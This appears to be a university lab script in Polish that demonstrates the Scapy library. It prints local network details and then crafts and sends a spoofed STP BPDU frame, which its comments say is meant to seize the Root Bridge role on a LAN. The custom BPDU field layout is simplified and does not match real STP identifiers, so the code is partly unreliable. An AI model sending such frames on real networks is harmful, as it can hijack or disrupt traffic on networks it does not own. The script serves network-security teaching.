# Programowanie Zaawansowane, Laboratorium 5: Poszukiwanie bibliotek o określonej funkcjonalności
# Celem jest zapoznanie się z wybranymi bibliotekami Pythona oraz przedstawienie działania wybranych funkcjonalności.
# https://github.com/Aksymand1/WSB-Python/tree/main/Zadanie%204
# Link do repozytorium GitHub.

"""Przykładowe funkcjonalności biblioteki Scapy w Pythonie."""

from scapy.all import Ether, conf, get_if_addr, get_if_hwaddr, sendp
from scapy.layers.l2 import STP
from scapy.fields import *
from scapy.packet import Packet

# Pobranie adresu IP interfejsu sieciowego
ip_address = get_if_addr(conf.iface)
print(f"Twój adres IPv4: {ip_address}")

mac_address = get_if_hwaddr(conf.iface)
print(f"Twój adres MAC: {mac_address}")

# Pobranie adresu IP bramy domyślnej podsieci
gw = conf.route.route("0.0.0.0")[2]
print(f"Adres IPv4 bramy domyślnej: {gw}\n")


"""Przykład manipulacji ramkami BPDU w celu testowania ataków na protokół STP."""
print("Pola ramki BPDU protokołu STP:")
for field in STP().fields_desc: # Wyświetlenie dostępnych pól w ramce BPDU
    print(field.name)
    
class BPDU(Packet):
    name = "BPDU"
    fields_desc = [
        ByteField("protocol_id", 0x02),
        ByteField("version", 0x02),
        ByteField("bpdu_type", 0x00),
        ByteField("flags", 0x00),
        ShortField("root_id", 0x0000),
        IntField("root_path_cost", 0x00000000),
        ShortField("bridge_id", 0x0000),
        ShortField("port_id", 0x0000),
        ShortField("message_age", 0x0000),
        ShortField("max_age", 0x0000),
        ShortField("hello_time", 0x0000),
        ShortField("forward_delay", 0x0000),
    ]
    
# Przykład tworzenia i wyświetlania ramki BPDU
bpdu_packet = BPDU(protocol_id=0x02, version=0x02, bpdu_type=0x00, flags=0x01,
                   root_id=0x00, root_path_cost=0x00000010, bridge_id=0x00, port_id=0x00,
                   message_age=0x01, max_age=0x14, hello_time=0x02, forward_delay=0x0f)

# Ustawienie odpowiednich wartości w polach ramki BPDU - najniższe priorytety (root_id, bridge_id) w celu przejęcia roli Root Bridge w sieci LAN

bpdu_packet.show()
sendp(Ether(src = "00:00:00:00:00:01",dst = "01:80:c2:00:00:00")/bpdu_packet, iface=conf.iface, count = 1) # wysłanie jednej ramki BPDU
# Ustawienie źródłowego adresu MAC na "00:00:00:00:00:01" w celu zwiększenia szans na przejęcie Root Bridge, gdyby inne
# urządzenia również miały priorytet 0.